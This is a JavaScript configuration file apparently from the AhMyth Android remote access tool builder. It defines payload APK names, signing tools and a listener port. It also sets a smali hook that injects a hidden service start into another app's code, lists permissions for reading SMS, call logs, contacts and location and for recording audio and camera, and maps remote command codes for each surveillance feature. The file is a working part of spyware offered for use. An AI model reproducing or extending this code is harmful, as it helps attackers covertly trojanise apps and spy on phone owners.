const path = require('path');


//---------------------App Controller Vars----------------------------------
exports.apkName = 'Ahmyth.apk';
exports.apkSourceName = 'Ahmyth';
exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
exports.dataDir = 'AhMyth'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.outputLogsPath = 'Logs';
exports.logColors = { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" };
exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 };
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
exports.ahmythService = 'ahmyth.mine.king.ahmyth.MainService';
exports.ahmythReceiver = 'ahmyth.mine.king.ahmyth.MyReceiver';
exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
exports.serviceStart = ';->start()V \n\n' +
  '    return-void';
exports.hookPoint = 'return-void';
exports.permissions = [
  'android.permission.WAKE_LOCK',
  'android.permission.CAMERA',
  'android.permission.READ_EXTERNAL_STORAGE',
  'android.permission.WRITE_EXTERNAL_STORAGE',
  'android.permission.MANAGE_EXTERNAL_STORAGE',
  'android.permission.WRITE_SETTINGS',
  'android.permission.WRITE_SECURE_SETTINGS',
  'android.permission.INTERNET',
  'android.permission.ACCESS_NETWORK_STATE',
  'android.permission.READ_SMS',
  'android.permission.SEND_SMS',
  'android.permission.RECEIVE_SMS',
  'android.permission.WRITE_SMS',
  'android.hardware.camera',
  'android.hardware.camera.autofocus',
  'android.permission.RECEIVE_BOOT_COMPLETED',
  'android.permission.READ_PHONE_STATE',
  'android.permission.READ_CALL_LOG',
  'android.permission.PROCESS_OUTGOING_CALLS',
  'android.permission.READ_CONTACTS',
  'android.permission.RECORD_AUDIO',
  'android.permission.MODIFY_AUDIO_SETTINGS',
  'android.permission.ACCESS_FINE_LOCATION',
  'android.permission.ACCESS_COARSE_LOCATION',
  'android.permission.ACCESS_BACKGROUND_LOCATION',
  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS'
];
exports.checkboxMap = {
  Permissions1: [
    'android.permission.CAMERA',
    'android.hardware.camera',
    'android.hardware.camera.autofocus',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions2: [
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.MANAGE_EXTERNAL_STORAGE',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions3: [
    'android.permission.RECORD_AUDIO',
    'android.permission.MODIFY_AUDIO_SETTINGS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions4: [
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.ACCESS_BACKGROUND_LOCATION',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions5: [
    'android.permission.READ_CONTACTS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions6: [
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.RECEIVE_SMS',
    'android.permission.WRITE_SMS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions7: [
    'android.permission.READ_PHONE_STATE',
    'android.permission.READ_CALL_LOG',
    'android.permission.PROCESS_OUTGOING_CALLS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
};

//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
  camera: 'x0000ca',
  fileManager: 'x0000fm',
  calls: 'x0000cl',
  sms: 'x0000sm',
  mic: 'x0000mc',
  location: 'x0000lm',
  contacts: 'x0000cn',

}
